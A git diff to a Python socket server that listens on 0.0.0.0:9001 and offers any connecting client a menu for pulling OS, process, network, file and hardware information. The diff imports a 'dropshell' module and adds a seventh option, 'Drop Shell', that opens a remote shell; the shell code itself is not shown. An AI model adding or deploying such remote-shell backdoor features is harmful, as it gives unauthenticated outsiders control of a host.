@@ -4,8 +4,9 @@ import sys
 from network import *
 from files import * 
 from usage import *
+from dropshell import *
 host = '0.0.0.0'
-port = 9001
+port = 9001 
 
 cyan  = "\033[0;96m"
 green   = "\033[0;92m"
@@ -34,7 +35,7 @@ def banner(con):
 
 def menu(con):
     banner(con)
-    mainMenu = b'\n\nChoose What To Retrieve!\n1. OS Information\n2. Process Information\n3. Information about Mama\n4. Network Information\n5. File and Directory\n6. Hardware Usage\n'
+    mainMenu = b'\n\nChoose What To Retrieve!\n1. OS Information\n2. Process Information\n3. Information about Mama\n4. Network Information\n5. File and Directory\n6. Hardware Usage\n7. Drop Shell'
     con.sendall(mainMenu)
     con.sendall(b'\nSpecify Option: ')
     opt = con.recv(1024)
@@ -52,6 +53,9 @@ def menu(con):
                 filesMenu(con)
             elif(opt == 6):
                 UsageMenu(con)
+            elif(opt == 7):
+                ShellMenu(con)
+                print('shell')
             else :
                 con.sendall(b'lol\n')
         except ValueError:
